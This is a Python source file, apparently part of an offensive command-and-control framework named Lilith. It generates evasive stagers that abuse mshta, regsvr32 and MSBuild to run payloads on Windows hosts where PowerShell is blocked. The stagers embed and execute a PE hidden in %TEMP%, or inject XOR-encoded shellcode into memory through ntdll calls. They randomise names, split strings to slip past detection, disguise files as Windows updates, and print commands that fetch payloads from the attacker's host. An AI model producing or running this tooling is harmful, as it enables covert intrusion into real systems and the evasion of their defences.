"""
Lilith — LOLBin stager builders for PowerShell-blocked environments.

Three delivery mechanisms, none touch powershell.exe:

  mshta      Self-contained .hta (VBScript): embeds runner PE as base64,
             decodes in-memory via XMLDOM, writes to %TEMP%, executes.
             Delivery:  mshta https://lhost:port/<name>.hta
                        mshta \\\\share\\<name>.hta
                        (or drop the .hta via existing foothold and call mshta locally)

  regsvr32   COM scriptlet .sct (VBScript): same logic, served from C2.
             Delivery:  regsvr32 /s /n /u /i:https://lhost:port/<name>.sct scrobj.dll
             Note: scrobj.dll validates TLS — self-signed cert will fail over HTTPS.
                   Use HTTP delivery or pre-drop the .sct file.

  msbuild    MSBuild XML with inline C# shellcode runner: two-layer XOR decodes
             C2 agent shellcode entirely in-memory — no PE on disk at any point.
             Delivery:  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe <name>.xml
                        %WinDir%\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe <name>.xml
"""
from __future__ import annotations

import base64
import os
import random
import secrets
import string

_DEFAULT_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
)

_HTA_NAMES  = ["update", "setup", "install", "verify", "activate", "validate", "portal"]
_SCT_NAMES  = ["handler", "provider", "service", "broker", "helper", "bridge", "agent"]
_MSB_NAMES  = ["task", "build", "target", "project", "restore", "compile", "config"]


def _rv(n: int = None) -> str:
    n = n or random.randint(1, 3)
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _rclass() -> str:
    return random.choice(string.ascii_uppercase) + "".join(
        random.choices(string.ascii_lowercase, k=random.randint(5, 9))
    )


def _vbs_split(s: str) -> str:
    """Split a string literal at random positions using VBScript & concatenation."""
    parts = []
    i = 0
    while i < len(s):
        chunk = random.randint(2, 5)
        parts.append(f'"{s[i:i+chunk]}"')
        i += chunk
    return " & ".join(parts)


def _vbs_runner_body(pe_b64: str) -> str:
    """
    VBScript that base64-decodes a PE from an embedded string,
    writes it to %TEMP%\\wct<rand>.exe, and executes it.
    Variable names randomised per call.
    """
    v_dom, v_el, v_raw = _rv(), _rv(2), _rv(2)
    v_stm, v_sh         = _rv(), _rv()
    v_dir, v_path       = _rv(2), _rv(2)

    # Split COM object names so literal strings are never plain
    dom_name  = _vbs_split("Microsoft.XMLDOM")
    adodb     = _vbs_split("ADODB.Stream")
    wsh       = _vbs_split("WScript.Shell")
    b64_attr  = _vbs_split("bin.base64")
    pct_temp  = _vbs_split("%TEMP%")

    # Split the base64 payload into chunks to avoid single giant string literal
    chunk_sz = 72
    b64_chunks = [pe_b64[i:i+chunk_sz] for i in range(0, len(pe_b64), chunk_sz)]
    b64_lines  = " & _\n    ".join(f'"{c}"' for c in b64_chunks)

    return (
        f"Dim {v_dom},{v_el},{v_raw},{v_stm},{v_sh},{v_dir},{v_path}\n"
        f"Set {v_dom}=CreateObject({dom_name})\n"
        f"Set {v_el}={v_dom}.createElement({_vbs_split('b')})\n"
        f"{v_el}.dataType={b64_attr}\n"
        f"{v_el}.text={b64_lines}\n"
        f"{v_raw}={v_el}.nodeTypedValue\n"
        f"Set {v_stm}=CreateObject({adodb})\n"
        f"{v_stm}.Type=1\n"
        f"{v_stm}.Open\n"
        f"{v_stm}.Write {v_raw}\n"
        f"Set {v_sh}=CreateObject({wsh})\n"
        f"{v_dir}={v_sh}.ExpandEnvironmentStrings({pct_temp})\n"
        f"{v_path}={v_dir} & {_vbs_split(chr(92))} & {_vbs_split('wct')} & Hex(Timer*1000) & {_vbs_split('.exe')}\n"
        f"{v_stm}.SaveToFile {v_path},2\n"
        f"{v_stm}.Close\n"
        f"{v_sh}.Run Chr(34) & {v_path} & Chr(34),0,False\n"
    )


# ── mshta HTA ─────────────────────────────────────────────────────────────────

def _build_hta(runner_b64: str) -> str:
    vbs = _vbs_runner_body(runner_b64)
    title = random.choice(["Windows Security Update", "System Configuration",
                           "Device Management", "Windows Update"])
    return (
        "<html>\n"
        "<head>\n"
        f"<title>{title}</title>\n"
        "<HTA:APPLICATION ID='app' APPLICATIONNAME='app' WINDOWSTATE='minimize' "
        "SHOWINTASKBAR='no' SYSMENU='no' CAPTION='no' SINGLEINSTANCE='yes'/>\n"
        "</head>\n"
        "<body>\n"
        "<script language='VBScript'>\n"
        f"{vbs}"
        "window.close\n"
        "</script>\n"
        "</body>\n"
        "</html>\n"
    )


# ── regsvr32 SCT scriptlet ────────────────────────────────────────────────────

def _random_guid() -> str:
    return (
        f"{secrets.token_hex(4).upper()}-"
        f"{secrets.token_hex(2).upper()}-"
        f"{secrets.token_hex(2).upper()}-"
        f"{secrets.token_hex(2).upper()}-"
        f"{secrets.token_hex(6).upper()}"
    )


def _build_sct(runner_b64: str) -> str:
    vbs  = _vbs_runner_body(runner_b64)
    guid = _random_guid()
    prog = "".join(random.choices(string.ascii_letters, k=random.randint(6, 12)))
    return (
        '<?XML version="1.0"?>\n'
        "<scriptlet>\n"
        f'<registration progid="{prog}" classid="{{{guid}}}">\n'
        '<script language="VBScript">\n'
        "<![CDATA[\n"
        f"{vbs}"
        "]]>\n"
        "</script>\n"
        "</registration>\n"
        "</scriptlet>\n"
    )


# ── msbuild XML ───────────────────────────────────────────────────────────────

def _build_msbuild_xml(sc_enc_b64: str) -> str:
    """
    MSBuild XML with inline C# that:
      1. Base64-decodes the embedded .enc bytes
      2. Two-layer XOR decodes (pack_enc format) → raw shellcode
      3. NtAllocateVirtualMemory + Marshal.Copy + NtProtectVirtualMemory (RX)
      4. NtCreateThreadEx — runner executes in-process, no PE on disk
    """
    task_cls   = _rclass()
    target_name = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))

    # Split the base64 payload into two halves so no single giant string literal
    mid = len(sc_enc_b64) // 2
    b64_expr = f'"{sc_enc_b64[:mid]}" + "{sc_enc_b64[mid:]}"'

    # Randomised local variable names inside C# (single letters + index to stay compact)
    ve, vk1, vm, vk2, vs = "e", "k1", "m", "k2", "s"
    vh, vb, vsz, vep, vps, vo, vt = "h", "b", "sz", "ep", "ps", "o", "t"

    cs = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using Microsoft.Build.Framework;\n"
        "using Microsoft.Build.Utilities;\n"
        f"public class {task_cls} : Task, ITask {{\n"
        "  [DllImport(\"ntdll\")] static extern int NtAllocateVirtualMemory("
        "IntPtr h,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint p);\n"
        "  [DllImport(\"ntdll\")] static extern int NtProtectVirtualMemory("
        "IntPtr h,ref IntPtr b,ref UIntPtr s,uint p,out uint o);\n"
        "  [DllImport(\"ntdll\")] static extern int NtCreateThreadEx("
        "out IntPtr t,uint a,IntPtr oa,IntPtr ph,IntPtr sr,IntPtr ag,uint f,"
        "UIntPtr zb,UIntPtr ss,UIntPtr ms,IntPtr al);\n"
        "  public override bool Execute() {\n"
        f"    byte[] {ve}=Convert.FromBase64String({b64_expr});\n"
        f"    byte {vk1}={ve}[0];\n"
        f"    byte[] {vm}=new byte[{ve}.Length-1];\n"
        f"    for(int i=0;i<{vm}.Length;i++) {vm}[i]=(byte)({ve}[i+1]^{vk1});\n"
        f"    byte {vk2}={vm}[0];\n"
        f"    byte[] {vs}=new byte[{vm}.Length-1];\n"
        f"    for(int i=0;i<{vs}.Length;i++) {vs}[i]=(byte)({vm}[i+1]^{vk2});\n"
        f"    IntPtr {vh}=(IntPtr)(-1);\n"
        f"    IntPtr {vb}=IntPtr.Zero;\n"
        f"    UIntPtr {vsz}=(UIntPtr)(uint){vs}.Length;\n"
        f"    NtAllocateVirtualMemory({vh},ref {vb},IntPtr.Zero,ref {vsz},0x3000,0x04);\n"
        f"    Marshal.Copy({vs},0,{vb},{vs}.Length);\n"
        f"    IntPtr {vep}={vb};UIntPtr {vps}=(UIntPtr)(uint){vs}.Length;uint {vo}=0;\n"
        f"    NtProtectVirtualMemory({vh},ref {vep},ref {vps},0x20,out {vo});\n"
        f"    IntPtr {vt};\n"
        f"    NtCreateThreadEx(out {vt},0x1FFFFF,IntPtr.Zero,{vh},{vb},IntPtr.Zero,"
        f"0,UIntPtr.Zero,(UIntPtr)0x200000,(UIntPtr)0x200000,IntPtr.Zero);\n"
        "    return true;\n"
        "  }\n"
        "}\n"
    )

    return (
        '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        f'  <Target Name="{target_name}">\n'
        f'    <{task_cls}/>\n'
        f'  </Target>\n'
        f'  <UsingTask TaskName="{task_cls}" TaskFactory="CodeTaskFactory"\n'
        '             AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.v4.0.dll">\n'
        '    <Task>\n'
        '      <Code Type="Class" Language="cs"><![CDATA[\n'
        f'{cs}'
        '      ]]></Code>\n'
        '    </Task>\n'
        '  </UsingTask>\n'
        '</Project>\n'
    )


# ── public entry points ────────────────────────────────────────────────────────

def build_mshta(
    runner_dat_path: str,
    runner_xor_key:  int,
    out_dir:         str,
    lhost:           str,
    port:            int,
    url_prefix:      str,
) -> str:
    with open(runner_dat_path, "rb") as f:
        raw_pe = bytes(b ^ runner_xor_key for b in f.read())
    pe_b64 = base64.b64encode(raw_pe).decode()

    hta_content = _build_hta(pe_b64)
    os.makedirs(out_dir, exist_ok=True)
    name      = random.choice(_HTA_NAMES) + ".hta"
    out_path  = os.path.join(out_dir, name)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(hta_content)

    delivery_url = f"https://{lhost}:{port}{url_prefix}/{name}"
    print(f"[+] mshta stager    : {out_path}  ({len(raw_pe):,} bytes PE embedded)")
    print(f"    Delivery URL    : {delivery_url}")
    print(f"[*] Execute from cmd.exe:")
    print(f"      mshta {delivery_url}")
    print(f"    Or drop the file first and run locally:")
    print(f"      mshta C:\\Windows\\Temp\\{name}")
    return out_path


def build_regsvr32(
    runner_dat_path: str,
    runner_xor_key:  int,
    out_dir:         str,
    lhost:           str,
    port:            int,
    url_prefix:      str,
) -> str:
    with open(runner_dat_path, "rb") as f:
        raw_pe = bytes(b ^ runner_xor_key for b in f.read())
    pe_b64 = base64.b64encode(raw_pe).decode()

    sct_content = _build_sct(pe_b64)
    os.makedirs(out_dir, exist_ok=True)
    name     = random.choice(_SCT_NAMES) + ".sct"
    out_path = os.path.join(out_dir, name)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(sct_content)

    delivery_url = f"https://{lhost}:{port}{url_prefix}/{name}"
    http_url     = f"http://{lhost}:80{url_prefix}/{name}"
    print(f"[+] regsvr32 SCT    : {out_path}  ({len(raw_pe):,} bytes PE embedded)")
    print(f"    Delivery URL    : {delivery_url}")
    print(f"[*] Execute from cmd.exe (requires valid TLS cert for HTTPS):")
    print(f"      regsvr32 /s /n /u /i:{delivery_url} scrobj.dll")
    print(f"[!] Self-signed cert → scrobj.dll will reject HTTPS. Alternatives:")
    print(f"      regsvr32 /s /n /u /i:{http_url} scrobj.dll  (HTTP, port 80)")
    print(f"      Drop .sct to disk, run: regsvr32 /s /n /u /i:C:\\Windows\\Temp\\{name} scrobj.dll")
    return out_path


def build_msbuild(
    sc_enc_path: str,
    out_dir:     str,
    lhost:       str,
    port:        int,
    url_prefix:  str,
) -> str:
    with open(sc_enc_path, "rb") as f:
        enc_bytes = f.read()
    # .enc is already base64(k1 || xor(...)) — pass the string directly so C#'s
    # Convert.FromBase64String() yields the raw bytes with k1 at index 0.
    sc_b64 = enc_bytes.decode("ascii").strip()

    xml_content = _build_msbuild_xml(sc_b64)
    os.makedirs(out_dir, exist_ok=True)
    name     = random.choice(_MSB_NAMES) + ".xml"
    out_path = os.path.join(out_dir, name)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(xml_content)

    delivery_url = f"https://{lhost}:{port}{url_prefix}/{name}"
    msbuild_x64  = r"%WinDir%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe"
    msbuild_x86  = r"%WinDir%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"
    print(f"[+] msbuild stager  : {out_path}  ({len(enc_bytes):,} bytes SC embedded, fileless)")
    print(f"    Delivery URL    : {delivery_url}")
    print(f"[*] Drop and execute from cmd.exe (no PS, no temp PE on disk):")
    print(f"      {msbuild_x64} C:\\Windows\\Temp\\{name}")
    print(f"      {msbuild_x86} C:\\Windows\\Temp\\{name}")
    return out_path


def build_lolbin_stagers(
    mode:            str,
    runner_dat_path: str,
    runner_xor_key:  int,
    sc_enc_path:     str | None,
    out_dir:         str,
    lhost:           str,
    port:            int,
    url_prefix:      str,
) -> None:
    modes = ["mshta", "regsvr32", "msbuild"] if mode == "all" else [mode]

    if "mshta" in modes:
        build_mshta(runner_dat_path, runner_xor_key, out_dir, lhost, port, url_prefix)

    if "regsvr32" in modes:
        build_regsvr32(runner_dat_path, runner_xor_key, out_dir, lhost, port, url_prefix)

    if "msbuild" in modes:
        if not sc_enc_path or not os.path.exists(sc_enc_path):
            print("[!] msbuild requires C2 agent shellcode — run: lilith build --runner first")
        else:
            build_msbuild(sc_enc_path, out_dir, lhost, port, url_prefix)
